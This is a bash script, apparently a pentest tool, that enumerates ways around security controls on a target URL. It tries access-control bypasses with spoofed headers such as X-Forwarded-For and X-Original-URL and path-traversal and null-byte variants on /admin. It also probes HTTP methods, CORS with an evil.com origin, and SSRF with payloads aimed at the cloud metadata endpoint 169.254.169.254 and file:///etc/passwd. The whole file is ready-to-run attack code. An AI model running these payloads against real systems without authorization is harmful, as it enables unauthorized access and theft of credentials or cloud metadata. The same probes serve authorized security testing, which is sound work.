#!/bin/bash
# Security bypass techniques enumeration script
# Author: Hackexdecodebreaker (https://github.com/Hackexdecodebreaker)
# WARNING: For authorized testing only

figlet -f slant "BYPASS"
toilet -f mono12 -F metal "Author: Hackexdecodebreaker"
toilet -f mono12 -F metal "GitHub: github.com/Hackexdecodebreaker"
echo ""

if [ $# -eq 0 ]; then
    echo "Usage: $0 <target-url-or-ip>"
    echo "Example: $0 https://example.com"
    exit 1
fi

TARGET=$1
OUTDIR="bypass_$(echo $TARGET | sed 's|https\?://||' | sed 's|/.*||')_$(date +%Y%m%d_%H%M%S)"
mkdir -p "$OUTDIR"

echo "[+] Security bypass enumeration on $TARGET"
echo "[+] Output directory: $OUTDIR"

# WAF detection
echo "[+] WAF detection..."
wafw00f "$TARGET" -o "$OUTDIR/waf.txt" 2>/dev/null || echo "  wafw00f not found"

# Cloudflare bypass attempts
echo "[+] Cloudflare bypass checks..."
echo "  Checking for origin IP leaks..."
curl -s -H "Host: $TARGET" "http://$TARGET" -o /dev/null -w "Origin IP check: %{http_code}\n" 2>/dev/null || true
dig +short "$TARGET" | head -20 > "$OUTDIR/dns_records.txt"
echo "  DNS records saved"

# HTTP header bypass tests
echo "[+] HTTP header bypass tests..."
HEADERS=(
    "X-Forwarded-For: 127.0.0.1"
    "X-Original-URL: /admin"
    "X-Rewrite-URL: /admin"
    "X-Host: localhost"
    "X-Forwarded-Host: localhost"
    "X-Custom-IP-Authorization: 127.0.0.1"
    "Client-IP: 127.0.0.1"
    "True-Client-IP: 127.0.0.1"
)

for header in "${HEADERS[@]}"; do
    code=$(curl -s -o /dev/null -w "%{http_code}" -H "$header" "$TARGET" 2>/dev/null)
    echo "  $header -> $code" >> "$OUTDIR/header_bypass.txt"
done

# Path traversal / normalization bypasses
echo "[+] Path normalization bypasses..."
PATHS=(
    "/admin"
    "/admin/"
    "/admin//"
    "/./admin/"
    "/admin/..;/"
    "/%2e%2e%2fadmin%2f"
    "/..;/admin"
    "//admin//"
    "/admin%20"
    "/admin%00"
    "/admin.json"
    "/admin.xml"
    "/api/admin"
    "/v1/admin"
)

for path in "${PATHS[@]}"; do
    code=$(curl -s -o /dev/null -w "%{http_code}" "$TARGET$path" 2>/dev/null)
    echo "  $path -> $code" >> "$OUTDIR/path_bypass.txt"
done

# HTTP method bypass
echo "[+] HTTP method bypass..."
METHODS=(GET POST PUT DELETE PATCH HEAD OPTIONS TRACE CONNECT)
for method in "${METHODS[@]}"; do
    code=$(curl -s -o /dev/null -w "%{http_code}" -X "$method" "$TARGET" 2>/dev/null)
    echo "  $method -> $code" >> "$OUTDIR/method_bypass.txt"
done

# JWT algorithm confusion
echo "[+] JWT algorithm confusion test..."
# This would need a JWT token to test - placeholder

# CORS misconfiguration
echo "[+] CORS misconfiguration check..."
curl -s -H "Origin: https://evil.com" -H "Access-Control-Request-Method: GET" -X OPTIONS "$TARGET" -I 2>/dev/null | grep -i "access-control-allow-origin" >> "$OUTDIR/cors.txt" || echo "  No CORS headers found"

# SSRF payloads
echo "[+] SSRF payload test..."
SSRF_PAYLOADS=(
    "http://127.0.0.1"
    "http://localhost"
    "http://169.254.169.254/latest/meta-data/"
    "http://[::1]"
    "http://0.0.0.0"
    "file:///etc/passwd"
)
for payload in "${SSRF_PAYLOADS[@]}"; do
    code=$(curl -s -o /dev/null -w "%{http_code}" "$TARGET?url=$payload" 2>/dev/null)
    echo "  $payload -> $code" >> "$OUTDIR/ssrf.txt"
done

echo ""
echo "[+] Bypass enumeration complete. Results in $OUTDIR/"
echo "[+] Files generated:"
ls -la "$OUTDIR/"
